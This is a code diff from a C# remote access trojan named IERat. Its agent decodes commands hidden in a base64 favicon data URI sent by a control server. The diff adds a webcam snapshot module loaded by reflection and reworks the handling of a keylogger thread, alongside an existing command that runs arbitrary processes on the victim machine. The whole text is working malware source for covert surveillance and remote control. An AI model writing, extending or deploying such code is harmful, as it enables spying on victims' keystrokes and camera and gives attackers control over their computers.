@@ -8,6 +8,7 @@ using System.Threading;
 using System.Threading.Tasks;
 using System.Web.Script.Serialization;
 using IERat.lib.Actions;
+using System.Reflection;
 
 namespace IERat.lib
 {
@@ -122,7 +123,7 @@ namespace IERat.lib
             {
                 favicon = favicon.Split(new string[] { "data:image/x-icon;base64," }, StringSplitOptions.None)[1];
                 string ResponseObjectJSON = Utils.Base64Decode(favicon);
-                JavaScriptSerializer js = new JavaScriptSerializer();
+                var js = new JavaScriptSerializer { MaxJsonLength = 2097152 * 3 };
                 ResponseObject responseObject = js.Deserialize<ResponseObject>(ResponseObjectJSON);
                 if (responseObject.Type == "NewAgent")
                 {
@@ -160,7 +161,23 @@ namespace IERat.lib
                             try
                             {
                                 NewAgentTask.Status = "Completed";
-                                if (CmdType == "execute")
+                                if (CmdType == "camsnapshot") // add other modules to the if that do not run as threads
+                                {
+                                    MethodInfo StartMethod = null;
+                                    if (this.agent.LoadedModules.ContainsKey("camsnapshot"))
+                                    {
+                                        StartMethod = (MethodInfo)this.agent.LoadedModules["camsnapshot"];
+                                    }
+                                    else
+                                    {
+                                        StartMethod = (MethodInfo)Modules.LoadModule(NewAgentTask.args);
+                                        NewAgentTask.args = "";
+                                        this.agent.LoadedModules.Add("camsnapshot", StartMethod);
+                                    }
+                                    byte[] result = (byte[])StartMethod.Invoke(null, null);
+                                    NewAgentTask.Result = Convert.ToBase64String(Utils.Compress(result));
+                                }
+                                else if (CmdType == "execute")
                                 {
                                     string procPath = NewAgentTask.args;
                                     string procArgs = "";
@@ -186,21 +203,22 @@ namespace IERat.lib
                                 {
                                     if (this.agent.LoadedModules.ContainsKey("klog"))
                                     {
-                                        if (this.agent.LoadedModules["klog"].ThreadState.ToString() == "Running")
+                                        Thread klogThread = (Thread)this.agent.LoadedModules["klog"];
+                                        if (klogThread.ToString() == "Running")
                                         {
                                             NewAgentTask.Result = "The Klog is already running";
                                         }
                                         else
                                         {
-                                            this.agent.LoadedModules["klog"].Resume();
+                                            klogThread.Resume();
                                             NewAgentTask.Result = "Klog Resumed";
                                         }
                                     }
                                     else
                                     {
-                                        var klogThread = Modules.LoadModule(NewAgentTask.args);
+                                        Thread klogThread = (Thread)Modules.LoadModule(NewAgentTask.args);
                                         this.agent.LoadedModules.Add("klog", klogThread);
-                                        this.agent.LoadedModules["klog"].Start();
+                                        klogThread.Start();
                                         NewAgentTask.Result = "Klog Loaded & Started";
                                     }
                                 }
@@ -208,9 +226,10 @@ namespace IERat.lib
                                 {
                                     if (this.agent.LoadedModules.ContainsKey("klog"))
                                     {
-                                        if (this.agent.LoadedModules["klog"].IsAlive == true)
+                                        Thread klogThread = (Thread)this.agent.LoadedModules["klog"];
+                                        if (klogThread.IsAlive == true)
                                         {
-                                            this.agent.LoadedModules["klog"].Suspend();
+                                            klogThread.Suspend();
                                             NewAgentTask.Result = "The Klog module was stopped";
                                         }
                                         else
